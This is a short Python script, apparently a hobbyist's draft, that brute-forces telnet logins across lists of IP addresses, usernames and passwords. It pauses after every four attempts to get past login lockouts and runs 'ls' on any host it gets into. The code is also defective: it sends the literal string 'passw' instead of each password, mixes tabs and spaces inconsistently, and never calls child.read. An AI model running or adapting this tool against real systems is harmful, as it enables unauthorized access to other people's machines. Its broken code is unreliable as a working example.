import pexpect
import time # for sleep for the login denial

# a file to put it in. When these all get combined make it one file?
f1 = open('./text2', 'w+')

# get the ips, users, and passwords from the file
ip = [line.rstrip('\n') for line in open('ip.txt')]
usr = [line.rstrip('\n') for line in open('users.txt')]
pw = [line.rstrip('\n') for line in open('passwords.txt')]

#this will need to read in from a file of ip addresses
for k in ip :
    telip = 'telnet ' + str(k)

    # username list 
    for l in usr :
        name = str(l)
	
	# I get four tries at a password
	count = 1
        # password list 
        for m in pw :
            passw = str(m)
            # Start the process to connect
            child = pexpect.spawn(telip)
	    # if we connect we get ------------------ BUT if it's refused 
	    child.expect(':')
	    child.sendline(name)
	    child.expect('Password:')
	    child.sendline('passw')
          
	    # increase count here, if we're at five, start again
	    count += 1
	    if count == 5 :
		time.sleep(15)
		child = pexpect.spawn(telip)
		count = 1

	    # we'll either get a prompt or back to login. I get four tries
	    i = child.expect(['$', ':'])
	    if i == 0 :
	        print(child.before)
		# were in. 
		child.sendline('ls')
		print(child.read)
	    	child.sendline('logout')

f1.close()
